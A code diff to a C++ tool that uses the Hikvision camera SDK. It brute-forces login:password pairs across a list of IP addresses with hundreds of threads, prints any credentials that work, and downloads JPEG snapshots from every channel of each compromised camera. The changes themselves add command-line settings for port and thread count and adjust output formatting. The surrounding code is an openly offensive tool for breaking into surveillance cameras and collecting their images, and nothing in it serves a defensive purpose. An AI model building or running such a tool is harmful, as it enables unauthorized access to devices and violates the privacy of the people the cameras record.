@@ -20,15 +20,25 @@ void brute(std::string ip);
 static std::mutex take_sync;
 static std::vector<std::string> ips;
 
-const int port = 8000;
-const int threads_count = 500;
+int port = 8000;
+int threads_count = 500;
 
 void loadPhotos(const std::string ip, const long user_id, const NET_DVR_DEVICEINFO_V30 device);
 
-int main() {
+int main(int argc, char **argv) {
+    //TODO: check type
+    if (argv[1] and argv[2]) {
+        port = atoi(argv[1]);
+        threads_count = atoi(argv[2]);
+    }
+
+    std::cout << "Port: " << port << std::endl;;
+    std::cout << "Threads: " << threads_count << std::endl;;
+
+
     mkdir("./pictures", 0655);
     if (!NET_DVR_Init()) {
-        std::cout << "Error NET_DVR_Init\n";
+        std::cout << "Error NET_DVR_Init" << std::endl;;
         return 0;
     }
     NET_DVR_SetConnectTime();
@@ -39,6 +49,7 @@ int main() {
         ips.push_back(line);
     }
 
+    //TODO: fix threads
     std::vector<std::thread> threads;
     for (int i = 0; i < threads_count; i++)
         threads.push_back(std::thread(bruteforce));
@@ -48,7 +59,7 @@ int main() {
 
     NET_DVR_Cleanup();
 
-    std::cout << "Press enter to continue ...\n";
+    std::cout << "Press enter to continue ..." << std::endl;;
     std::cin.get();
     return 0;
 }
@@ -93,7 +104,7 @@ void brute(std::string ip) {
         UserID = NET_DVR_Login_V30((char *) host, (const WORD) port, (char *) login, (char *) password,
                                    &device_info);
 
-        std::cout << "Trying " << login << ":" << password << " for " << ip << std::endl;
+        std::cout << "Trying " << login << ":" << password << " for " << ip << ":" << port << std::endl;
         if (UserID != -1) {
             std::cout << "\t\t\t\t\t\t\t\t" << login << ":" << password << "@" << ip << ":" << port
                       << std::endl;
@@ -119,7 +130,8 @@ void loadPhotos(const std::string ip, const long user_id, const NET_DVR_DEVICEIN
         params.wPicSize = 0;
         if (NET_DVR_CaptureJPEGPicture((LONG) user_id, channel, &params, (char *) filename.c_str())) {
             chmod(filename.c_str(), 0655);
-            std::cout << "\t\t\t\t\t\t\t\tGetting a photo (channel " << channel << ") from the camera " << ip << ":" << port << "..."
+            std::cout << "\t\t\t\t\t\t\t\tGetting a photo (channel " << channel << ") from the camera " << ip << ":"
+                      << port << "..."
                       << std::endl;
         }
     }
